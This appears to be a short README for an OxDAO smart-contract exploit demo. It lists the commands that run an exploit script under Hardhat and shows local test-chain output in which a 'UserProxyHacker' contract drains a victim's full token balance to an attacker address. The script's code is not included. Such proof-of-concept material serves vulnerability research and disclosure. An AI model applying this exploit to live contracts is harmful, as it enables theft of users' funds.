# OxDAO Exploit Demo.

```shell
# Init node modules.
$ npm i 

# Run exploit.
$ npx hardhat run scripts/exp.js
LpToken deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
Victim 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 balance: 100000.0
Hacker 0xc0b0000000000000000000000000000000000000 balance: 0.0
MockUserProxyImplementation deployed to: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
UserProxyFactory deployed to: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
UserProxyInterface deployed to: 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9
UserProxyHacker deployed to: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9
Victim 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 balance: 0.0
Hacker 0xc0b0000000000000000000000000000000000000 balance: 100000.0
```
